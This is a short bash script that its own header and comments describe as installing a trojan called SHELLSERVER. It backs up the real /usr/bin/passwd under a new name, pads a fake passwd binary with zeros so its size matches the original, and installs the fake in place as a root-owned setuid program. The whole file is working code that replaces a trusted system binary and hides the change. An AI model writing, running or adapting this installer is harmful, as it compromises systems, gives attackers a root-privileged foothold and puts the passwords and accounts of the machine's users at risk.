#!/usr/bin/bash

##############################
# Installs SHELLSERVER       #
# Author: Stefan Stockinger  #
##############################

#path to fake passwd executable (might needs to be adapted)
fake_passwd="$PWD/passwd"

real_passwd="/usr/bin/passwd"
real_passwd_backup="/usr/bin/chpwd"


# check if backup already exists (mean trojan already installed)
# exit in this case, to avoid overriting of backuped real passwd
if [[ -f "$real_passwd_backup" ]]
then
    echo "exit: already installed"
    exit
else 
    echo "install now"
fi

#get size of real and fake passwd cmd
size_real=$(du -b $real_passwd | cut -f1)
size_fake=$(du -b $fake_passwd | cut -f1)

#calculate size difference
diff=$(expr $size_real - $size_fake)

# append the fake cmd to reache the same size
dd if=/dev/zero count=$diff bs=1c >> $fake_passwd

# copy files and set permissions
sudo chown root $fake_passwd
sudo chmod 4755 $fake_passwd
sudo cp $real_passwd $real_passwd_backup
sudo chown root $real_passwd_backup
sudo chmod 4755 $real_passwd_backup
sudo cp $fake_passwd $real_passwd
